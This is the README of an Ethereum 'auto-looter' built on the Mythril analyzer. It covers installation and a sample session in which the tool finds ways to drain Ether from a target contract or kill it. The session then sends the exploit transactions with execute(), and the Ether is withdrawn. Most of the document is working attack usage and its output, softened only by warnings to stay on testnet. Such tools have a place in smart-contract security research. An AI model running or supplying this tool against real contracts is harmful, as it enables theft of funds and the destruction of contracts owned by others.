# Scrooge McEtherface

[![Discord](https://img.shields.io/discord/481002907366588416.svg)](https://discord.gg/E3YrVtG)

Scrooge McEtherface is an Ethereum auto-looter based on [Mythril](https://github.com/ConsenSys/mythril/). It exploits instances of [Ether theft](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105) and [self-destruction](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-106) caused by various issues including [integer arithmetic bugs](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101), [exposed initialization functions](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118) and others. Use at your own peril.

## Installation

```bash
$ git clone https://github.com/b-mueller/scrooge-mcetherface
$ cd scrooge-mcetherface
$ pip install -r requirements.txt
$ cp config.ini.example config.ini
```

Python 3.5 or higher is required. Set up your RPC URL and Ethereum address in `config.ini`. The easiest way to test is using [Ganache](https://truffleframework.com/ganache).

The `symbolic_tx_count` parameter sets a bound on the number of transactions being explored.

## Usage

Start a session by running:

```
$ ./scrooge <address>
```

This will analyze the smart contract at the target address, output any vulnerabilites found and spawn a Python shell:

```
$ ./scrooge 0x3b1d02336205d1f22961c0f462abfe083e515921
Scrooge McEtherface at your service.
Analyzing 0x3B1D02336205D1F22961C0F462aBfE083E515921 over 2 transactions.
Found 2 attacks:

ATTACK 0: Anyone can withdraw ETH from the contract account.
  0: Call data: 0xff9913e8 bebebebebebebebebebebebe7752B465f7452bF49B8A5f43977Efb261060D2Ef, call value: 0x0
  1: Call data: 0x6aba6fa1 , call value: 0x0

ATTACK 1: The contract can be killed by anyone.
  0: Call data: 0xff9913e8 bebebebebebebebebebebebe7752B465f7452bF49B8A5f43977Efb261060D2Ef, call value: 0x0
  1: Call data: 0xc96cd46f , call value: 0x0

Python 3.6.3 (default, Jan  8 2018, 08:49:07) 
(InteractiveConsole)
>>> 
```

You now have access to a list of [Raid](https://github.com/b-mueller/scrooge-mcetherface/blob/5584c54d6a6da1a08a162b51569b47dbb525c5d1/scmf/raid.py#L62) objects, each of which represents a sequence of transactions that exploit a bug.

```
>>> r = raids[0]
>>> print(r.pretty()) 
Anyone can withdraw ETH from the contract account.
  0: Call data: 0xff9913e8 bebebebebebebebebebebebe7752B465f7452bF49B8A5f43977Efb261060D2Ef, call value: 0x0
  1: Call data: 0x6aba6fa1 , call value: 0x0
```

Use `execute()` to send the transactions to the blockchain:

```
>>>  r.execute()
Transaction sent successfully, tx-hash: 0x93f4a72d3ce897c4525a336249f32ae0704f6c0fed6b7b935801d5c7e68ca4b9. Waiting for transaction to be mined...
Transaction sent successfully, tx-hash: 0x21d1e77f6f629377ac227ec2e33f78b1d073c175826c0b161265121a74c2393b. Waiting for transaction to be mined...
True
```

This returns `True` if Ether was successfully withdrawn from the target account.

## Support

**No support for this tool exists whatsoever.**

## Important Notes

- This is a weekend project that hasn't been extensively tested. Don't use it on mainnet.
- Act responsibly and don't accidentally kill anyone else's contract.
- **Use only on testnet and at your own risk**.
